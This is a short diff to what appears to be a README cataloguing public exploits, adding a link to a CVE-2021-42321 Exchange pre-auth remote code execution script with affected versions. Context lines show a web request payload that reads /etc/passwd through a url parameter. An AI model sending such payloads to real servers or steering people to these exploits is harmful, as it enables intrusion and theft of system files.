@@ -40,6 +40,13 @@ PoC:
 
 GET /api/geojson?url=file:/etc/passwd HTTP/1.1
 ```
+
+[CVE-2021-42321 Exchange Pre-Auth RCE](https://github.com/0x0021h/expbox/blob/main/CVE-2021-42321.py)
+```
+<= Exchange 2016 update 22
+<= Exchange 2019 update 11
+```
+
 ### Note
 
 All content comes from the Internet, if there is a copyright problem, please contact me to delete.
